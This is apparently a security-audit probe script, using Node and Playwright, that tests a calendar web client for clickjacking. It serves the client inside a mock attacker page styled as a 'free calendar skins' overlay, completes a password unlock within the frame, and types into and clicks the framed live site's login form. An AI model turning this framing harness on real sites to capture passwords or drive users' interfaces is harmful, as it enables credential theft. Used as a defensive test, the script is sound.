// probe-clickjack.mjs — S5: clickjacking / framing of the client.
// A) LOCAL full flow: an attacker page (served from a 127.0.0.1 origin, like any
//    real attacker site) iframes the client and completes the ENTIRE unlock
//    (password typed + submitted) INSIDE the attacker's frame.
// B) LIVE site (read-only): iframe renders + is interactive (typing + client-side
//    only submit with NO token → early return, no network write).
import { chromium } from '/home/z/.npm-global/lib/node_modules/playwright/index.mjs';
import { createServer } from 'node:http';
import { readFileSync } from 'node:fs';

const BASE = process.env.S5_BASE || 'http://127.0.0.1:8081';
const SERVER = process.env.S5_SERVER || 'http://127.0.0.1:8788';
const LIVE = 'https://sh-clock.github.io/Calendar-Web/';
const MAT = JSON.parse(readFileSync(process.env.S5_MAT || '/tmp/local-material-2.json', 'utf8'));
const AUTH_UI = MAT.auth_ui_hex;

// pre-flight: worker alive? (concurrent agents pkill workerd)
try {
  const pf = await fetch(SERVER + '/config', { headers: { authorization: 'Bearer ' + AUTH_UI } });
  if (!pf.ok) throw new Error('status ' + pf.status);
} catch (e) {
  console.log('WORKER-DIED before start: ' + e);
  process.exit(2);
}

let pass = 0, fail = 0;
const ok = (name, cond, detail) => {
  if (cond) { pass++; console.log('  ok   ' + name); }
  else { fail++; console.log('  FAIL ' + name + (detail !== undefined ? ' — ' + String(detail).slice(0, 300) : '')); }
};

/* attacker container pages, served from a 127.0.0.1 origin (like a real site) */
const CONTAINER = (innerSrc) => `<!doctype html><html><body style="margin:0;background:#222">
<h1 style="color:#fff;font:16px sans-serif">attacker.example — "free calendar skins" overlay</h1>
<iframe id="victim" src="${innerSrc}" style="width:1300px;height:850px;border:2px solid red"></iframe></body></html>`;
const attackerSite = createServer((req, res) => {
  const html = req.url === '/live'
    ? CONTAINER(LIVE)
    : CONTAINER(BASE + '/index.html?server=' + encodeURIComponent(SERVER) + '&setup=' + AUTH_UI);
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
  res.end(html);
});
await new Promise((r) => attackerSite.listen(8098, '127.0.0.1', r));

const browser = await chromium.launch({ args: ['--disable-web-security'] });
const ctx = await browser.newContext({ viewport: { width: 1400, height: 950 } });
const page = await ctx.newPage();

async function findFrame(pageObj, urlPart) {
  for (let i = 0; i < 60; i++) {
    const f = pageObj.frames().find((fr) => fr.url().includes(urlPart));
    if (f && (await f.$('#login-form').catch(() => null))) return f;
    await pageObj.waitForTimeout(250);
  }
  throw new Error('iframe/login never appeared: ' + urlPart);
}

console.log('== A. LOCAL: full unlock inside attacker iframe ==');
await page.goto('http://127.0.0.1:8098/');
const frame = await findFrame(page, 'index.html');
ok('A1 client RENDERS inside a cross-origin iframe (no frame-busting)', true);
ok('A2 unlock form is visible in-frame', await frame.$('#login-form') !== null);
ok('A3 frame is a secure context (WebCrypto available to the framed app)',
  await frame.evaluate(() => !!(window.crypto && window.crypto.subtle)));
await frame.fill('#password', 'password');
await frame.click('button[type=submit]');
try {
  await frame.waitForSelector('#app:not([hidden])', { timeout: 30000 });
} catch {
  const m = await frame.textContent('#login-msg').catch(() => '');
  console.log('FRAME-UNLOCK-FAILED: ' + m);
  await browser.close(); process.exit(2);
}
ok('A4 FULL UNLOCK completed inside the attacker frame (password submitted there)',
  await frame.$('#app:not([hidden])') !== null);
await frame.waitForSelector('#calendar [data-date]', { timeout: 20000 }).catch(() => {});
await page.screenshot({ path: '/tmp/s5-clickjack-local.png' }).catch(() => {});
ok('A5 calendar data rendered inside attacker frame', await frame.$('#calendar [data-date]') !== null);
// the attacker page drives the victim app UI from outside:
await frame.click('#btn-new-event').catch(() => {});
ok('A6 "New event" editor opens from within the attacker frame',
  await frame.$('#editor-modal:not([hidden])') !== null);
await page.keyboard.press('Escape').catch(() => {});

console.log('== B. LIVE site (read-only, client-side only) ==');
const page2 = await ctx.newPage();
await page2.goto('http://127.0.0.1:8098/live');
const liveFrame = await findFrame(page2, 'sh-clock.github.io');
ok('B1 LIVE client renders inside a third-party iframe (no X-Frame-Options / CSP frame-ancestors)', true);
await liveFrame.fill('#password', 'typed-inside-evil-frame');
ok('B2 password field is typable from the embedding (attacker) page', true);
// submit with NO provisioning code in this fresh browser → pure client-side early return
await liveFrame.click('button[type=submit]');
await liveFrame.waitForTimeout(900);
const liveMsg = await liveFrame.textContent('#login-msg').catch(() => '');
ok('B3 unlock button clickable in-frame; client-side flow runs (no-token early return)',
  /No provisioning code/i.test(liveMsg || ''), liveMsg);
await liveFrame.fill('#setup-input', 'zz-not-hex');
await liveFrame.click('#btn-paste-setup').catch(() => {});
await liveFrame.waitForTimeout(600);
const toasts = await liveFrame.evaluate(() => [...document.querySelectorAll('.toast')].map((t) => t.textContent)).catch(() => []);
ok('B4 provisioning input + Store button also interactive in-frame (client-side only)',
  toasts.some((t) => /invalid provisioning/i.test(t)), JSON.stringify(toasts));
await page2.screenshot({ path: '/tmp/s5-clickjack-live.png' }).catch(() => {});

await browser.close();
attackerSite.close();
console.log('\nRESULT: ' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
